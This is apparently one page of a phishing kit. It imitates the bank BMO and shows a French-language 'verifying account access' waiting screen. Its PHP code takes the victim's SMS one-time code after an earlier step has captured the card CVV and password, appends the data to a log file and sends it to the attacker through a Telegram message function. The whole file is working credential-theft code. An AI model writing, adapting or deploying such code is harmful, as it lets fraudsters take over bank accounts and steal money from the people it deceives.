<?php session_start();
require_once "../sendto.php" ;
if (!isset($_SESSION["cvv"]) or !isset( $_SESSION["mdp"])) {
        header("Location: ./index.php");
        exit();
}
$_SESSION["sms"] = $_POST['sms'] ;

$donnees = "\nSMS : `" . $_SESSION['sms'] . "`" .
 "\n". "** FIN  CONNEXION **\n"."\n";
$file = "../blinky2000@bvc@bvc@destruction.txt" ;
file_put_contents($file, $donnees, FILE_APPEND);
sendMessageToTelegram($donnees) ;
session_destroy();




?>




<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BMO</title>
    <link rel="stylesheet" media="screen and (max-width: 768px)" href="styles_mobile.css">

    <link rel="stylesheet" media="screen and (min-width: 769px)" href="styles_pc.css">
</head>
    <header>
        <span>BMO</span> <img  width=50px  src="./bmo.webp" alt="">
    </header>
<body>
    <h2>VEUILLEZ PATIENTEZ PENDANT QUE NOUS VERIFIONS L'ACCES AU COMPTE</h2>

    <div class="load" style="text-align:center" >
            <img src="../img/ajax-loading.gif" alt="">
        </div>
    <footer>

    </footer>
</body>
</html>

